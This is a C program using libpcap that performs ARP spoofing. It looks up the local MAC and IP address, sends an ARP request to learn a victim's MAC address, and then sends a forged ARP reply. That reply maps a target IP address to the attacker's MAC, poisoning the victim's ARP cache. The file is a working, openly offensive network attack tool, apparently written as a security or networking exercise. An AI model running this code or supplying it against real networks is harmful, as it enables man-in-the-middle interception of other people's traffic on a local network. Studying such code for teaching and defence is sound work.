#include <pcap.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <linux/netdevice.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <netinet/ether.h>

/* to get my MAC  and IP */
struct ifreq ifr;
u_int8_t myip[4] = {0,0,0,0};
u_int8_t mymac[6] = {0,0,0,0};

/* struct for arp packet */
struct arphdrr {
	u_int16_t ar_hrd;
	u_int16_t ar_pro;
	u_int8_t ar_hln;
	u_int8_t ar_pln;
	u_int16_t ar_op;
	u_int8_t arp_sha[6];
	u_int8_t arp_spa[4];
	u_int8_t arp_tha[6];
	u_int8_t arp_tpa[4];
};


void send_arp_request(pcap_t* pcd, u_int8_t* victim_ip){
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if(fd<0) perror("socket fail");
	strcpy(ifr.ifr_name, "ens33");
	if(ioctl(fd, SIOCGIFHWADDR, &ifr)<0) perror("ioctl fail");  // get MAC address
	memcpy(mymac, ifr.ifr_hwaddr.sa_data, 6);
	if(ioctl(fd,SIOCGIFADDR, &ifr)<0) perror("ioctl fail");  // get IP address
	memcpy(myip,&(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), 4*sizeof(*myip));

	u_char packet[50];

	struct ether_header *send_eth = (struct ether_header *)packet;
	struct arphdrr *send_arp = (struct arphdrr *)(packet+sizeof(ether_header));


	for(int i = 0; i<6; i++){  // input MAC address to struct
		send_eth->ether_dhost[i] = 0xff;  //broadcast mac
		send_arp->arp_tha[i] = 0x00;  //mac to know
		send_eth->ether_shost[i] = mymac[i];  //my mac
		send_arp->arp_sha[i] = mymac[i];  //my mac
	} 
		send_eth->ether_type = htons(ETHERTYPE_ARP);
		send_arp->ar_hrd = htons(ARPHRD_ETHER);
		send_arp->ar_pro = htons(ETHERTYPE_IP);
		send_arp->ar_hln = 0x06;
		send_arp->ar_pln = 0x04;
		send_arp->ar_op = htons(ARPOP_REQUEST);
		
		memcpy(send_arp->arp_spa, myip, 4);  //my ip
		memcpy(send_arp->arp_tpa, victim_ip, 4);  //victim ip
		
		pcap_sendpacket(pcd,(u_char*)packet,42);
}

void send_arp_reply(pcap_t* pcd, u_int8_t* victim_ip, u_int8_t* destmac, u_int8_t* target_ip){
	u_char packet[50];

	struct ether_header *send_eth = (struct ether_header *)packet;
	struct arphdrr *send_arp = (struct arphdrr *)(packet+sizeof(ether_header));


	for(int i = 0; i<6; i++){
		send_eth->ether_dhost[i] = destmac[i];  //victim mac
		send_arp->arp_tha[i] = destmac[i];  //mac to know
		send_eth->ether_shost[i] = mymac[i];  //my mac
		send_arp->arp_sha[i] = mymac[i];  //my mac
	}
		send_eth->ether_type = htons(ETHERTYPE_ARP);
		send_arp->ar_hrd = htons(ARPHRD_ETHER);
		send_arp->ar_pro = htons(ETHERTYPE_IP);
		send_arp->ar_hln = 0x06;
		send_arp->ar_pln = 0x04;
		send_arp->ar_op = htons(ARPOP_REPLY);

		memcpy(send_arp->arp_spa, target_ip, 4);  //target ip
		memcpy(send_arp->arp_tpa, victim_ip, 4);  //victim ip

		pcap_sendpacket(pcd,(u_char*)packet,42);
}


void usage() {
	printf("syntax: pcap_test <interface> <victim's ip> <target ip>\n");
	printf("sample: pcap_test ens33 192.168.43.7 192.168.43.5\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
	
	u_int8_t victim_ip[4];
	u_int8_t target_ip[4];
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
					
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
	fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}
	struct ether_header *tmp_eth;
	struct arphdrr *tmp_arp;

	inet_aton(argv[2], (in_addr*)victim_ip);
	inet_aton(argv[3], (in_addr*)target_ip);
	send_arp_request(handle, victim_ip);
	uint8_t *getmac;
	
	while (1) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;
						
		tmp_eth = (struct ether_header *)packet;
		if (ntohs(tmp_eth->ether_type) != ETHERTYPE_ARP) continue;  // if packet is not ARP
		tmp_arp = (struct arphdrr *)(packet + sizeof(ether_header));
		if(ntohs(tmp_arp->ar_op) == ARPOP_REPLY){  // if packet is ARP REPLY
			getmac = tmp_arp->arp_sha;
			break;
		}
	}
	send_arp_reply(handle, victim_ip, getmac, target_ip);  // send fake ARP packet
												
	pcap_close(handle);
	return 0;
}


